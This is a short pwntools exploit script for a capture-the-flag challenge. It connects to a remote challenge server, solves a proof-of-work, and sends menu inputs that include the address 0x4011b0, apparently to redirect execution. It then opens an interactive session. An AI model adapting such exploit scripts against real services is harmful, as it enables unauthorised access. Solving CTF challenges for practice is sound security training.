from pwn import *
import subprocess

elf = ELF('./chal')
p = remote('kctf.rozdzka.securing.pl', 30002)

data = p.recvuntil("pow) solve ")
data = p.recvline().decode().strip()
print(' '.join(['python', 'pow.py', 'solve', data]))
res = subprocess.check_output(['python3', 'pow.py', 'solve', data])
p.sendline(res)
print(p.clean())
p.sendline(b'4')
p.sendline(b'11')
p.sendline(b'0x4011b0')
p.sendline(b'3')

p.interactive()
